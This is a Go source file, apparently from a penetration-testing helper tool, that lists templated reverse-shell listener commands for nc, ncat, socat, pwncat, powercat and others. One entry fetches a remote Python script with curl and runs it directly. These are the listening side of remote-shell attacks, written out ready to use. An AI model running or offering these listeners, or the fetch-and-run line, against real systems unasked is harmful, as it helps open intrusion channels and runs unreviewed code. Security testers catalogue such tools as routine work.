package data

import "github.com/groundsec/secbutler/pkg/types"

var RevShellListeners = []types.RevShellListener{
	{Name: "nc", ListenerTpl: "nc -lvnp {{PORT}}"},
	{Name: "nc freebsd", ListenerTpl: "nc -lvn {{PORT}}"},
	{Name: "busybox nc", ListenerTpl: "busybox nc -lp {{PORT}}"},
	{Name: "ncat", ListenerTpl: "ncat -lvnp {{PORT}}"},
	{Name: "ncat.exe", ListenerTpl: "ncat.exe -lvnp {{PORT}}"},
	{Name: "ncat (TLS)", ListenerTpl: "ncat --ssl -lvnp {{PORT}}"},
	{Name: "rlwrap + nc", ListenerTpl: "rlwrap -cAr nc -lvnp {{PORT}}"},
	{Name: "rustcat", ListenerTpl: "rustcat listen {{PORT}}"},
	{Name: "pwncat", ListenerTpl: "python3 -m pwncat -lp {{PORT}}"},
	{Name: "Windows ConPty", ListenerTpl: "stty raw -echo; (stty size; cat) | nc -lnvp {{PORT}}"},
	{Name: "socat", ListenerTpl: "socat -d -d TCP-LISTEN:{{PORT}} STDOUT"},
	{Name: "socat (TTY)", ListenerTpl: "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{{PORT}}"},
	{Name: "powercat", ListenerTpl: "powercat -l -p {{PORT}}"},
	{Name: "hoaxshell", ListenerTpl: "python3 -c \"$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)\" -t cmd-curl -p {{PORT}}"},
}
